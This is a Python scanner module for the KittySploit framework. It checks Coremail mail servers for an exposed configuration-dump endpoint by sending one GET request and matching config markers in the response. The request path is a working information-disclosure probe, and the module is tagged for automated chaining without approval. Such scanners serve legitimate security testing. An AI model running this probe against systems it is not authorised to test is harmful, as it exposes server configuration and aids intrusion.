#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Coremail configuration information was discovered."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Coremail - Config Discovery Detection',
        'description': 'Coremail configuration information was discovered.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'exposure', 'config', 'coremail', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': ['https://www.secpulse.com/archives/107611.html'],
    }

    def run(self):
        r = self.http_request(method="GET", path='/mailsms/s?func=ADMIN:appState&dumpConfig=/', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_any = ('<object name="cm_md_db">', 'containerDefinitions', '<string name="User">coremail</string>', '<string name="EnableCoremailSmtp">',)
        if (any(m in body for m in body_any)):
            self.set_info(
                severity='high',
                reason="Coremail - Config Discovery detected",
                path='/mailsms/s?func=ADMIN:appState&dumpConfig=/',
            )
            return True
        return False

